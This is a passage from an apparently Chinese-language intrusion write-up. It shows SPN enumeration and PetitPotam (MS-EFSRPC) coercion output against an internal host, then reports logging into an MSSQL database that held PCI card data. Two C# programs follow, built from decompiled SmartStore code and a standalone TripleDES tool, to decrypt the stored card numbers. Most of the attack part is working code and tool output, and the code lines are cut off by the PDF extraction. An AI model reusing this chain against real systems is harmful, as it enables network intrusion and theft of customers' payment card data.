        Write-Host $SPN      
11
    }
12
    Write-host ""
13
}
发现NYCPP05B是⼀台db，不知道是不是靶标
9
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-
10
11
              PoC to elicit machine account authentication via some MS-EFSRPC fun
12
                                      by topotam (@topotam77)
13
14
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
15  
16  
17  
18
[-] Connecting to ncacn_np:10.10.4.169[\PIPE\lsarpc]
19
[+] Connected!
20
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
21
[+] Successfully bound!
22
[-] Sending EfsRpcOpenFileRaw!
23
[+] Got expected ERROR_BAD_NETPATH exception!!
24
[+] Attack worked!
25  
通过抓取NYCPP05B⽤机器认证(⾛web代理)登陆mssql后发现pci数据
通过数据库对表名称来对web源码分析 由于是mvc mc都在dll⾥⾯所以先看看v
很快定位到对应到views
\Administration\Views\Order
通过cshtml发现调⽤对Order 处理的时候调⽤的是.net的这些类
namespace SmartStore.Services.Orders
namesapce SmartStore.Data.Mapping.Orders
namespace SmartStore.Admin.Models.Orders
通过反编译查看源码不难获取更改card*数据时候加密算法如下
进⼀步跟进获取加密算法
最后导⼊dll实现解密算法如下
1
using System;
2
using System.Collections.Generic;
3
using System.Linq;
4
using System;
5
using System.IO;
6
using System.Security.Cryptography;
7
using System.Text;
8
using System.Text;
9
using SmartStore.Services.Security;
10
using SmartStore.Core.Domain.Security;
11
using System.Threading.Tasks;
12
using System.Reflection;
13  
14
namespace Decode
15
{
16
public class Class1
17
{
18
static void Main(string[] args)
19
{
20
SecuritySettings securitySettings = new SecuritySettings()
21
{
22
EncryptionKey = ""
如下加解密成功
当然你也可以通过扣源码对⽅法对加密进⾏解密如下
yp
y
23
};
24
EncryptionService encryptionService = new EncryptionService(se
25  
26
string texts = "eloXXoHmbAPMWD5SPCwT9A==";
27
Console.WriteLine("encode :"+encryptionService.EncryptText("Vi
28
Console.WriteLine("decode : "+encryptionService.DecryptText(te
29  
30  
31
}
32
}
33
}
1
using System;
2
using System.IO;
3
using System.Security.Cryptography;
4
using System.Text;
5  
6
namespace Crpyt
7
{
8
    class Program
g
9
    {
10
        static void Main(string[] args)
11
        {
12
            if (args.Length == 3 && args[0].ToLower().Equals("decrypt"))
13
            {
14
                string encryptionPrivateKey = args[1];
15  
16
                string cipherText = args[2];
17  
18
                var tDESalg = new TripleDESCryptoServiceProvider();
19
                tDESalg.Key = new ASCIIEncoding().GetBytes(encryptionPrivateKey.S
20
                tDESalg.IV = new ASCIIEncoding().GetBytes(encryptionPrivateKey.Su
21  
22
                byte[] buffer = Convert.FromBase64String(cipherText);
23
                string plaintext = DecryptTextFromMemory(buffer, tDESalg.Key, tDE
24  
25
                Console.WriteLine("{0}", plaintext);
26
            }
27
            else if (args.Length == 3 && args[0].ToLower().Equals("encrypt"))
28
            {
29
                string encryptionPrivateKey = args[1];
30  
31
                string plaintext = args[2];
32  
33
                var tDESalg = new TripleDESCryptoServiceProvider();
34
                tDESalg.Key = new ASCIIEncoding().GetBytes(encryptionPrivateKey.S
35
                tDESalg.IV = new ASCIIEncoding().GetBytes(encryptionPrivateKey.Su
36  
37
                byte[] cipherText = EncryptTextToMemory(plaintext, tDESalg.Key, t
38  
39
                Console.WriteLine("{0}", Convert.ToBase64String(cipherText));
40
            }
41
            else
42
            {
43
                Console.WriteLine("Usage:\Crpyt.exe encrypt/decrypt key plaintext
44
            }
45  
46
        }
47  
48
        private static string DecryptTextFromMemory(byte[] data, byte[] key, byte
49
        {
50
            using (var ms = new MemoryStream(data))
51
            {
52
                using (var cs = new CryptoStream(ms, new TripleDESCryptoServicePr
53
                {
54
                    var sr = new StreamReader(cs, new UnicodeEncoding());
55
                    return sr.ReadLine();
56
                }
57
            }
58
        }
59  
60
        private static byte[] EncryptTextToMemory(string data, byte[] key, byte[]
61
        {
62
            using (var ms = new MemoryStream())
63
            {
64
                using (var cs = new CryptoStream(ms, new TripleDESCryptoServicePr
65
                {
66
                    byte[] toEncrypt = new UnicodeEncoding().GetBytes(data);
67
                    cs.Write(toEncrypt, 0, toEncrypt.Length);
68
                    cs.FlushFinalBlock();
69
                }
70  
71
                return ms.ToArray();
72
            }
73
        }
74
    }
75
}